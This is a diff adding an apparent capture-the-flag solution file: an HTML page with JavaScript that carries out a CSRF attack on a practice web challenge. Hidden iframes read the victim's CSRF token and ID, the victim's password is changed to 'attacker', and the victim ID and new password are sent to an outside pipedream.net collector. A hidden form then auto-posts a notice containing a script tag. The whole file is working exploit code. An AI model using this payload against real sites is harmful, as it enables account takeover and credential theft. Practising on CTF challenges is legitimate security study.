@@ -1,0 +1,36 @@
+<iframe src="http://ctf.segfaulthub.com:7777/csrf_3/mypage.php" name="getcsrftoken" id="getcsrftoken" onload="exploit()" frameborder="0" width="0" height="0" style="visibility: hidden"> </iframe>
+<iframe name="writeframe" id="writeframe" frameborder="0" width="0" height="0" style="visibility: hidden" sandbox="allow-scripts"></iframe>
+<form action="http://ctf.segfaulthub.com:7777/csrf_3/notice_write_process.php" method="post" target="writeframe">
+    <input name="create_title" type="hidden" value="범죄도시3 티켓 판매합니다." />
+    <input name="create_body" type="hidden" value="<script>console.log('CSRF 공격으로 악성 게시물 업로드')</script>" />
+</form>
+
+<script>
+    async function exploit() {
+        try {
+            let iframe = document.getElementById("getcsrftoken");
+            let csrf_token = iframe.contentWindow.document.forms[0].csrf_token.value;
+            let victimID = iframe.contentWindow.document.forms[0].id.placeholder;
+            let updateForm = new FormData();
+            updateForm.append("pw", "attacker");
+            updateForm.append("csrf_token", csrf_token);
+            let response = await fetch("http://ctf.segfaulthub.com:7777/csrf_3/mypage_update.php", {
+                method: "POST",
+                body: updateForm,
+            });
+            if (response.ok) {
+                let victimPW = updateForm.get("pw");
+                await fetch("https://eodhhttu9beaqkb.m.pipedream.net", {
+                    method: "POST",
+                    body: new URLSearchParams({ victimID, victimPW }),
+                });
+
+                document.forms[0].submit();
+            }
+        } catch (error) {
+            let err = error.toString();
+            let attackerUrl = "https://eodhhttu9beaqkb.m.pipedream.net?error=" + err;
+            await fetch(attackerUrl);
+        }
+    }
+</script>
